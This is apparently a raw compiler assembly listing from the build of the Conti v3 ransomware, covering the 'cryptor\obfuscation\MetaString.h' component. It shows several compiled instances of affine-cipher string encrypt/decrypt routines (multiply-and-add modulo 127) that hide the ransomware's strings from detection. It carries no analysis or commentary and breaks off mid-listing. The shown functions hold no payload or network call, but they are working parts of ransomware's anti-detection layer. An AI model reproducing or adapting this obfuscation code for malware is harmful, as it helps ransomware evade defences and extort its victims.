?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 40	 sub	 eax, 64			; 00000040H
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 40	 add	 r8d, 64			; 00000040H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 7d	 sub	 eax, 125		; 0000007dH
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 7d	 add	 r8d, 125		; 0000007dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 04	 sub	 eax, 4
  00006	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00012	41 f7 e8	 imul	 r8d
  00015	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001a	41 03 d0	 add	 edx, r8d
  0001d	c1 fa 06	 sar	 edx, 6
  00020	8b ca		 mov	 ecx, edx
  00022	c1 e9 1f	 shr	 ecx, 31
  00025	03 d1		 add	 edx, ecx
  00027	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002a	44 2b c1	 sub	 r8d, ecx
  0002d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00031	41 f7 e8	 imul	 r8d
  00034	41 03 d0	 add	 edx, r8d
  00037	c1 fa 06	 sar	 edx, 6
  0003a	8b ca		 mov	 ecx, edx
  0003c	c1 e9 1f	 shr	 ecx, 31
  0003f	03 d1		 add	 edx, ecx
  00041	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00044	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00047	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004b	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 59	 imul	 r8d, eax, 89		; 00000059H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 04	 add	 r8d, 4
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 25	 sub	 eax, 37			; 00000025H
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 25	 add	 r8d, 37			; 00000025H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 38	 add	 r8d, 56			; 00000038H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 13 00 00 00	 mov	 ecx, 19
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1b	 imul	 r8d, ecx, 27

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
